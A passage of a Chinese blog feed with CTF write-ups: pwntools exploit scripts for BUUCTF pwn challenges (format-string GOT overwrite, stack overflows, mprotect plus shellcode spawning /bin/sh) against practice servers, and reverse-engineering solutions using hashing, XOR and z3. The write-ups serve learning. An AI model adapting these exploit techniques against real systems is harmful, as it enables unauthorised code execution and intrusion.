title="0x2：修改函数地址为system地址"></a>0x2：修改函数地址为system地址</h4><p>由于该程序是动态链接的，但是没有开启PIE保护，且<code>atoi</code>函数的参数是我们可以控制的。我们知道<code>plt</code>是地址的填写者，<code>got</code>是地址的保存者。因此可以通过修改<code>atoi</code>的<code>got</code>地址跳转到<code>plt</code>表项来执行system函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./space5&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29157</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./space5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]   </span><br><span class="line">system_plt_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;atoi_addr:system_plt_addr&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your passwd&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level2</title>
      <link href="/2024/01/21/buuctf_pwn/jarvisoj_level2/"/>
      <url>/2024/01/21/buuctf_pwn/jarvisoj_level2/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="#"></a>#</h2><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240121190841695.png" alt="image-20240121190841695"></p><p>这题其实蛮简单的但是涉及到了gdb的多线程调试，故记录一下。</p><p>尝试gdb调试，提示gdb开始调试子进程，然后子进程退出，打开ida查看一下，可以看到在vulnerable_function()中，在<code>system(&quot;echo Input:&quot;);</code>才进入漏洞函数，那么我们就需要又</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240121192806633.png" alt="image-20240121192806633"></p><p>由于system函数会打开一个shell执行命令，会<code>folk</code>一个子进程，因此我们需要使gdb一只调试主进程，</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240121192936732.png" alt="image-20240121192936732"></p><p>gdb多线程调试常用操作</p><p><a href="https://www.cnblogs.com/liuhanxu/p/17011777.html">GDB调试多进程的命令介绍和演示 - 刘跑跑 - 博客园 (cnblogs.com)</a></p><div class="table-container"><table><thead><tr><th>info inferiors</th><th>查看所有进程</th></tr></thead><tbody><tr><td>inferiors 2</td><td>切换到编号为2的进程</td></tr><tr><td>detach inferiors 2</td><td>detach掉编号为2的进程</td></tr><tr><td>kill inferiors 2</td><td>kill掉编号为2的进程</td></tr><tr><td>set follow-fork-mode parent</td><td>只调试父进程（GDB默认）</td></tr><tr><td>set follow-fork-mode child</td><td>只调试子进程</td></tr><tr><td>show follow-fork-mode</td><td>查看follow-fork-mode当前值</td></tr><tr><td>set detach-on-fork on</td><td>只调试一个进程，父进程或子进程（GDB默认）</td></tr><tr><td>set detach-on-fork off</td><td>同时调试父子进程，另一个进程阻塞在fork位置</td></tr><tr><td>show detach-on-fork</td><td>查看detach-on-fork当前值</td></tr><tr><td>set schedule-multiple off</td><td>只有当前进程会执行，其他进程挂起（GDB默认）</td></tr><tr><td>set schedule-multiple on</td><td>所有的进程都会正常执行</td></tr><tr><td>show schedule-multiple</td><td>查看schedule-multiple当前值</td></tr></tbody></table></div><p>set follow-fork-mode parent,之后就可以愉快<code>cyclic</code>了</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240121191843726.png" alt="image-20240121191843726"></p><h3 id="jarvisoj-level02"><a href="#jarvisoj-level02" class="headerlink" title="jarvisoj_level02"></a>jarvisoj_level02</h3><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./jarvisoj_level02&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27147</span>)</span><br><span class="line">hint_addr=<span class="number">0x0804A024</span></span><br><span class="line">system_addr=<span class="number">0x0804849E</span></span><br><span class="line">pattern=<span class="number">140</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*pattern+p32(system_addr)+p32(hint_addr)+p32(hint_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h3><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26522</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>)+p64(<span class="number">0x4006b3</span>)+p64(<span class="number">0x600A90</span>)+p64(<span class="number">0x4004C0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get_started_3dsctf_2016</title>
      <link href="/2024/01/20/buuctf_pwn/get_started_3dscft_2016/"/>
      <url>/2024/01/20/buuctf_pwn/get_started_3dscft_2016/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="#"></a>#</h2><p>栈溢出，查看漏洞函数。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240120114902316.png" alt="image-20240120114902316"></p><p>我们可以直接将程序控制流转移到打开文件来绕过if语句</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh= remote(&quot;node5.buuoj.cn&quot;,26045)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x080489b8</span></span><br><span class="line">offset = <span class="number">56</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset+p32(addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240120133100503.png" alt="image-20240120133100503"></p><p>但是远程打不通，百度得知linux缓冲有三种，Linux平台对设备文件默认开启行缓冲，<strong>对磁盘文件默认开启全缓冲</strong>。</p><p>1）全缓冲。输入或输出缓冲区被填满，会进行实际I/O操作。其他情况，如强制刷新、进程结束也会进行实际I/O操作。</p><p>对于读操作来说，当读入内容的字节数等于缓冲区大小或者文件已经到达结尾，或者强制刷新，会进行实际的I/O操作，将外存文件内容读入缓冲区；对于写操作来说，当缓冲区被填满或者强制刷新，会进行实际的I/O操作，缓冲区内容写到外存文件中。磁盘文件操作通常是全缓冲的。</p><p>（2）行缓冲。输入或输出缓冲区遇到换行符会进行实际I/O操作。其他与全缓冲相同。</p><p>（3）无缓冲。没有缓冲区，数据会立即读入内存或者输出到外存文件和设备上。标准错误输出stderr是无缓冲的，这样保证错误信息能够及时反馈给用户，供用户排除错误。</p><p><a href="https://cloud.tencent.com/developer/article/1176374">C的全缓冲、行缓冲和无缓冲-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>由于<code>putchar</code>不输出换行符，无法刷新缓冲流，因此我们要正确退出程序或者输出换行符使得flag得以输出。</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29430</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_flag=<span class="number">0x80489A0</span></span><br><span class="line">arg_1=<span class="number">0x308CD64F</span></span><br><span class="line">arg_2=<span class="number">0x195719D1</span></span><br><span class="line">exit=<span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(get_flag)+p32(exit)+p32(arg_1)+p32(arg_2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>这题由于是静态链接，可以通过<code>mprotect</code>函数修改内存的读写权限</p><p>由于是32位程序，通过栈传递参数，我们选取三个pop指令来pop掉参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">mprotect=elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">pop3_ret=<span class="number">0x0804f460</span></span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">gets_addr=elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">56</span>*<span class="string">b&#x27;a&#x27;</span>+p32(mprotect)+p32(pop3_ret)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"><span class="comment">#payload+=p32(read_addr)+p32(buf)+p32(0)+p32(buf)+p32(0x100)</span></span><br><span class="line">payload+=p32(gets_addr)+p32(buf)+p32(buf)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>segmentation fault 和stack smach</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CrackRTF</title>
      <link href="/2023/12/29/buuctf_re_WP/CrackRTF/"/>
      <url>/2023/12/29/buuctf_re_WP/CrackRTF/</url>
      
        <content type="html"><![CDATA[<h3 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h3><p><img src="../../img/image-20231227230247505.png" alt="image-20231227230247505"></p><p>函数atoi将输入的字符串化为整型，同时限定了<code>v7</code>为长度为6的字符串，因此我门可以尝试爆破，<code>sub_401230</code>有标识符0x8004u,判断为sha1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">string=<span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    flag=<span class="built_in">str</span>(i)+string</span><br><span class="line">    x = hashlib.sha1(flag.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    y = x.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == y:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>123321@DBApp <br/></p><p>passwd（2）只限定了输入的长度，有 95^6种可能 (可见字符),显然无法直接爆破。</p><p><img src="../../img/image-20231230222606143.png" alt="image-20231230222606143"></p><p>在<code>sub_4014D0</code>我们发现了</p><p><code>hResInfo = FindResourceA(0, (LPCSTR)0x65, &quot;AAA&quot;);</code><br/></p><ol><li>0,资源在与当前进程关联的可执行文件</li><li>0x65,资源的名称。<code>int(0x65)=101</code></li><li>“AAA”,资源类型</li><li>返回资源的句柄</li></ol><p>用ResourceHacker打开exe文件</p><p><img src="../../img/image-20231230222026583.png" alt="image-20231230222026583"></p><p>将字符串与str进行循环异或</p><p><img src="../../img/image-20231230224121440.png" alt="image-20231230224121440"></p><p>紧接着创建了一个rtf文件，将异或后的字符串写入<br/>刚开始不是很理解，在看了师傅的wp后。如果要让此rtf文件可用，那么文件头必须是特定格式</p><p><img src="../../img/image-20231230225417284.png" alt="image-20231230225417284"></p><p>rtf文件头为`{\rtf1，我们只需求出str前六个字符即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">head=<span class="string">&#x27;&#123;\\rtf1&#x27;</span></span><br><span class="line">key=[<span class="number">0x05</span>,<span class="number">0x7D</span>,<span class="number">0x41</span>,<span class="number">0x15</span>,<span class="number">0x26</span>,<span class="number">0x01</span> ]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(key[i]^<span class="built_in">ord</span>(head[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>输出~!3a@0</p><p><img src="../../img/image-20231230230333816.png" alt="image-20231230230333816"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp2</title>
      <link href="/2023/12/28/buuctf_re_WP/wp2/"/>
      <url>/2023/12/28/buuctf_re_WP/wp2/</url>
      
        <content type="html"><![CDATA[<h3 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240121195642455.png" alt="image-20240121195642455"></p><p>base64换表，给出了加密后的字符串，那么我们只需要找到换表函数即可，通过交叉引用查看到关键函数</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240121195958533.png" alt="image-20240121195958533"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base=<span class="built_in">list</span>(base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    x=base[i]</span><br><span class="line">    base[i]=base[<span class="number">19</span>-i]</span><br><span class="line">    tmp= <span class="number">19</span>-i</span><br><span class="line">    base[tmp]=x</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(base))</span><br></pre></td></tr></table></figure><p>base64解密即可</p><h3 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231228215929613.png" alt="image-20231228215929613"></p><p>猜测是base64换表</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231228215912337.png" alt="image-20231228215912337"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3求解器</title>
      <link href="/2023/12/26/buuctf_re_WP/z3%E6%B1%82%E8%A7%A3%E5%99%A8/"/>
      <url>/2023/12/26/buuctf_re_WP/z3%E6%B1%82%E8%A7%A3%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h1><p>z3有整型(Int),实型(Real)和向量(BitVec)。</p><p>先生成一个求解对象<code>Solver</code></p><p>solver.model()求解</p><h3 id="BUUCTF-re-GUET-CTF2019-re"><a href="#BUUCTF-re-GUET-CTF2019-re" class="headerlink" title="BUUCTF-re-[GUET-CTF2019]re"></a>BUUCTF-re-[GUET-CTF2019]re</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.add( <span class="number">1629056</span> * a1[<span class="number">0</span>] == <span class="number">166163712</span> )</span><br><span class="line">s.add( <span class="number">6771600</span> * a1[<span class="number">1</span>] == <span class="number">731332800</span> )</span><br><span class="line">s.add( <span class="number">3682944</span> * a1[<span class="number">2</span>] == <span class="number">357245568</span> )</span><br><span class="line">s.add( <span class="number">10431000</span> * a1[<span class="number">3</span>] == <span class="number">1074393000</span> )</span><br><span class="line">s.add( <span class="number">3977328</span> * a1[<span class="number">4</span>] == <span class="number">489211344</span> )</span><br><span class="line">s.add( <span class="number">5138336</span> * a1[<span class="number">5</span>] == <span class="number">518971936</span> )</span><br><span class="line">s.add( <span class="number">7532250</span> * a1[<span class="number">7</span>] == <span class="number">406741500</span> )</span><br><span class="line">s.add( <span class="number">5551632</span> * a1[<span class="number">8</span>] == <span class="number">294236496</span> )</span><br><span class="line">s.add( <span class="number">3409728</span> * a1[<span class="number">9</span>] == <span class="number">177305856</span> )</span><br><span class="line">s.add( <span class="number">13013670</span> * a1[<span class="number">10</span>] == <span class="number">650683500</span> )</span><br><span class="line">s.add( <span class="number">6088797</span> * a1[<span class="number">11</span>] == <span class="number">298351053</span> )</span><br><span class="line">s.add( <span class="number">7884663</span> * a1[<span class="number">12</span>] == <span class="number">386348487</span> )</span><br><span class="line">s.add( <span class="number">8944053</span> * a1[<span class="number">13</span>] == <span class="number">438258597</span> )</span><br><span class="line">s.add( <span class="number">5198490</span> * a1[<span class="number">14</span>] == <span class="number">249527520</span> )</span><br><span class="line">s.add( <span class="number">4544518</span> * a1[<span class="number">15</span>] == <span class="number">445362764</span> )</span><br><span class="line">s.add( <span class="number">3645600</span> * a1[<span class="number">17</span>] == <span class="number">174988800</span> )</span><br><span class="line">s.add( <span class="number">10115280</span> * a1[<span class="number">16</span>] == <span class="number">981182160</span> )</span><br><span class="line">s.add( <span class="number">9667504</span> * a1[<span class="number">18</span>] == <span class="number">493042704</span> )</span><br><span class="line">s.add( <span class="number">5364450</span> * a1[<span class="number">19</span>] == <span class="number">257493600</span> )</span><br><span class="line">s.add( <span class="number">13464540</span> * a1[<span class="number">20</span>] == <span class="number">767478780</span> )</span><br><span class="line">s.add( <span class="number">5488432</span> * a1[<span class="number">21</span>] == <span class="number">312840624</span> )</span><br><span class="line">s.add( <span class="number">14479500</span> * a1[<span class="number">22</span>] == <span class="number">1404511500</span> )</span><br><span class="line">s.add( <span class="number">6451830</span> * a1[<span class="number">23</span>] == <span class="number">316139670</span> )</span><br><span class="line">s.add( <span class="number">6252576</span> * a1[<span class="number">24</span>] == <span class="number">619005024</span> )</span><br><span class="line">s.add( <span class="number">7763364</span> * a1[<span class="number">25</span>] == <span class="number">372641472</span> )</span><br><span class="line">s.add( <span class="number">7327320</span> * a1[<span class="number">26</span>] == <span class="number">373693320</span> )</span><br><span class="line">s.add( <span class="number">8741520</span> * a1[<span class="number">27</span>] == <span class="number">498266640</span> )</span><br><span class="line">s.add( <span class="number">8871876</span> * a1[<span class="number">28</span>] == <span class="number">452465676</span> )</span><br><span class="line">s.add( <span class="number">4086720</span> * a1[<span class="number">29</span>] == <span class="number">208422720</span> )</span><br><span class="line">s.add( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">s.add(<span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">a1 = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">a1[<span class="number">31</span>] = <span class="number">125</span></span><br><span class="line">a1[<span class="number">30</span>] = <span class="number">55</span></span><br><span class="line">a1[<span class="number">29</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">28</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">27</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">26</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">25</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">24</span>] = <span class="number">99</span></span><br><span class="line">a1[<span class="number">23</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">22</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">21</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">20</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">19</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">18</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">16</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">17</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">15</span>] = <span class="number">98</span></span><br><span class="line">a1[<span class="number">14</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">13</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">12</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">11</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">10</span>] = <span class="number">50</span></span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">52</span></span><br><span class="line">a1[<span class="number">8</span>] = <span class="number">53</span></span><br><span class="line">a1[<span class="number">7</span>] = <span class="number">54</span></span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">101</span></span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">123</span></span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">103</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">108</span></span><br><span class="line">a1[<span class="number">0</span>] = <span class="number">102</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a1[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章——物理层</title>
      <link href="/2023/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%89%A9%E7%90%86%E5%B1%82/"/>
